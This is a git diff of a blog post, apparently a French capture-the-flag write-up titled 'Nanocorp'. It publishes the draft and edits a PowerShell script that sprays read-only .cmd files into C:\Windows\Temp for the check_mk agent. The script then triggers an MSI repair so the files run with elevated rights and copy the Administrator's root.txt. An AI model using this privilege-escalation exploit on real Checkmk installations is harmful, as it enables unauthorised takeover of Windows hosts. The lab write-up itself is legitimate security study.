@@ -1,6 +1,6 @@
 +++
 date = '2025-11-14T14:47:10+01:00'
-draft = true
+draft = false
 title = 'Nanocorp'
 +++
 
@@ -124,7 +124,7 @@ param(
     [int]$MaxPID = 15000,
 )
 
-$BatchPayload = 'type "C:\Users\Administrator\Desktop\root.txt" > "C:\Abc\root_output.txt"'
+$Payload = 'type "C:\Users\Administrator\Desktop\root.txt" > "C:\Windows\Temp\root_output.txt"'
 $msi = "C:\Windows\Installer\1e6f2.msi"
 
 # Spray des fichiers .cmd utilisées par check_mk
@@ -133,7 +133,7 @@ foreach ($counter in 0..1) {
     for ($processId = $MinPID; $processId -le $MaxPID; $processId++) {
         $filePath = "C:\Windows\Temp\cmk_all_$processId" + "_$counter.cmd"
         try {
-            [System.IO.File]::WriteAllText($filePath, $BatchPayload)
+            [System.IO.File]::WriteAllText($filePath, $Payload)
             Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
         } catch {
             Write-Host "Impossible d'écrire $filePath"
@@ -142,13 +142,13 @@ foreach ($counter in 0..1) {
 }
 
 Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn"
-Write-Host "Root.txt written to C:/Abc/root_output.txt"
+Write-Host "Root.txt written to C:/Windows/Temp/root_output.txt"
 ```
 
 ---
 
 ```powershell
-type C:/Abc/root_output.txt
+type C:/Windows/Temp/root_output.txt
 [REDACTED]
 ```
 
